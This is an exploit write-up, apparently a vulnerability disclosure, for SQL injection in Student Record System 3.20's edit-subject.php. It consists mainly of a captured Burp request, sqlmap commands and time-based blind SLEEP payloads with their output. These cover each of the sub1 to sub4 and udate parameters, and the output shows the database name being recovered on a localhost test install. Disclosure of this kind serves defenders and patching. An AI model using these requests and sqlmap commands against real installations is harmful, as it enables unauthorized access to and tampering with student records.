# Student Record System - SQL Injection - 4
+ **Exploit Title:** Student Record System - SQL Injection - 4
+ **Date:** 2024-01-04
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://phpgurukul.com/student-record-system-php/
+ **Software Link:** https://phpgurukul.com/?sdm_process_download=1&download_id=7216
+ **Version:** 3.20
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number

## Description:
Student Record Managment System 3.20 allows SQL Injection via the 'sub1', 'sub2' , 'sub3', 'sub4' and 'udate' parameters in "http://localhost/studentrecordms/edit-subject.php". Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to this address: "http://localhost/studentrecordms/manage-subjects.php"
+ Click edit button.
+ Then click update course button
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:
```
POST /studentrecordms/edit-subject.php?sid=1 HTTP/1.1
Host: localhost
Content-Length: 111
Cache-Control: max-age=0
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/studentrecordms/edit-subject.php?sid=1
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: language=en; continueCode=5vLeVxlRzkNb47vKDPMo5Lq8wdzLtvf1Hem0jn6EZm2ygrX19BpaQWOJY3oM; welcomebanner_status=dismiss; cookieconsent_status=dismiss; PHPSESSID=16p8fmbt5nnt6j32qlumjroui0
Connection: close

sub1=C+Language&sub2=Operating+System&sub3=Data+Structure&sub4=Mathmatics&udate=01-04-2024&submit=Update+Course
```

+ Use sqlmap to exploit. In sqlmap, use 'sub1' parameter to dump the database.
```
sqlmap -r r.txt -p sub1 --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: sub1 (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: sub1=C Language' AND (SELECT 4008 FROM (SELECT(SLEEP(5)))dkGJ)-- dJtT&sub2=Operating System&sub3=Data Structure&sub4=Mathmatics&udate=01-04-2024&submit=Update Course
---
[01:51:59] [INFO] the back-end DBMS is MySQL
[01:51:59] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
web application technology: PHP 8.2.12, Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[01:52:04] [INFO] fetching current database
multi-threading is considered unsafe in time-based data retrieval. Are you sure of your choice (breaking warranty) [y/N] N
[01:52:04] [INFO] retrieved: 
[01:52:14] [INFO] adjusting time delay to 1 second due to good response times
studentrecorddb
current database: 'studentrecorddb''
```
+ current database: `studentrecorddb`

![Ekran görüntüsü 2024-04-01 085432](https://github.com/BurakSevben/CVEs/assets/117217689/52eb19cc-86d6-4033-ac3c-e6ae714529da)

## Sub 2 Parameter:

+ Use sqlmap to exploit. In sqlmap, use 'sub2' parameter to dump the database.
```
sqlmap -r r.txt -p sub2 --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: sub2 (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: sub1=C Language&sub2=Operating System' AND (SELECT 2954 FROM (SELECT(SLEEP(5)))PJYZ)-- qLNx&sub3=Data Structure&sub4=Mathmatics&udate=01-04-2024&submit=Update Course
---
[01:56:12] [INFO] the back-end DBMS is MySQL
web application technology: PHP 8.2.12, Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[01:56:12] [INFO] fetching current database
multi-threading is considered unsafe in time-based data retrieval. Are you sure of your choice (breaking warranty) [y/N] N
[01:56:12] [INFO] resumed: studentrecorddb
current database: 'studentrecorddb'
```
+ current database: `studentrecorddb`

![Ekran görüntüsü 2024-04-01 085643](https://github.com/BurakSevben/CVEs/assets/117217689/f42b43bd-d408-4343-a292-7789c0d12860)


## Sub 3 Parameter:

+ Use sqlmap to exploit. In sqlmap, use 'sub3' parameter to dump the database.
```
sqlmap -r r.txt -p sub3 --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: sub3 (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: sub1=C Language&sub2=Operating System&sub3=Data Structure' AND (SELECT 2339 FROM (SELECT(SLEEP(5)))etVm)-- ouGg&sub4=Mathmatics&udate=01-04-2024&submit=Update Course
---
[01:59:34] [INFO] the back-end DBMS is MySQL
web application technology: PHP 8.2.12, Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[01:59:34] [INFO] fetching current database
multi-threading is considered unsafe in time-based data retrieval. Are you sure of your choice (breaking warranty) [y/N] N
[01:59:34] [INFO] resumed: studentrecorddb
current database: 'studentrecorddb'
```
+ current database: `studentrecorddb`

![Ekran görüntüsü 2024-04-01 090809](https://github.com/BurakSevben/CVEs/assets/117217689/2330c124-2d31-4c35-9f08-cc97f8309aab)


## Sub 4 Parameter:

+ Use sqlmap to exploit. In sqlmap, use 'sub4' parameter to dump the database.
```
sqlmap -r r.txt -p sub4 --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: sub4 (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: sub1=C Language&sub2=Operating System&sub3=Data Structure&sub4=Mathmatics' AND (SELECT 7347 FROM (SELECT(SLEEP(5)))xCWP)-- TSCI&udate=01-04-2024&submit=Update Course
---
[02:11:14] [INFO] the back-end DBMS is MySQL
web application technology: PHP 8.2.12, Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[02:11:14] [INFO] fetching current database
multi-threading is considered unsafe in time-based data retrieval. Are you sure of your choice (breaking warranty) [y/N] N
[02:11:14] [INFO] resumed: studentrecorddb
current database: 'studentrecorddb
```
+ current database: `studentrecorddb`

![Ekran görüntüsü 2024-04-01 091140](https://github.com/BurakSevben/CVEs/assets/117217689/7b7ad9b8-e4c3-4814-8058-de6f453ac93c)

## udate Parameter:

+ Use sqlmap to exploit. In sqlmap, use 'udate' parameter to dump the database.
```
sqlmap -r r.txt -p udate --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: udate (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: sub1=C Language&sub2=Operating System&sub3=Data Structure&sub4=Mathmatics&udate=01-04-2024' AND (SELECT 7763 FROM (SELECT(SLEEP(5)))YChG)-- jZwB&submit=Update Course
---
[02:14:31] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.58, PHP 8.2.12
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[02:14:31] [INFO] fetching current database
multi-threading is considered unsafe in time-based data retrieval. Are you sure of your choice (breaking warranty) [y/N] N
[02:14:31] [INFO] resumed: studentrecorddb
current database: 'studentrecorddb'
```
+ current database: `studentrecorddb`

![Ekran görüntüsü 2024-04-01 091553](https://github.com/BurakSevben/CVEs/assets/117217689/c3b8940f-75f4-4818-9474-dee6c3c3e0df)

